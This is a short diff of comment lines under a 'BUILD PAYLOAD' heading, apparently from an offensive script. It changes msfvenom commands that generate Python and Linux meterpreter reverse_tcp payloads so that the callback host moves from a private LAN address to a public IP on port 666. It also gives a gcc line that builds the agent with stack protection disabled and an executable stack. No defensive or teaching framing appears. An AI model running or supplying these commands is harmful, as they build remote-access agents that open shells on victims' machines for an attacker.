@@ -46,8 +46,8 @@
 #
 #
 # [ BUILD PAYLOAD ]
-# msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.67 LPORT=666 -f raw -o agent.py
-# OR: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.67 LPORT=666 -f c -o template.c
+# msfvenom -p python/meterpreter/reverse_tcp LHOST=185.196.11.32 LPORT=666 -f raw -o agent.py
+# OR: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=185.196.11.32 LPORT=666 -f c -o template.c
 # gcc -fno-stack-protector -z execstack template.c -o agent
 #
 #
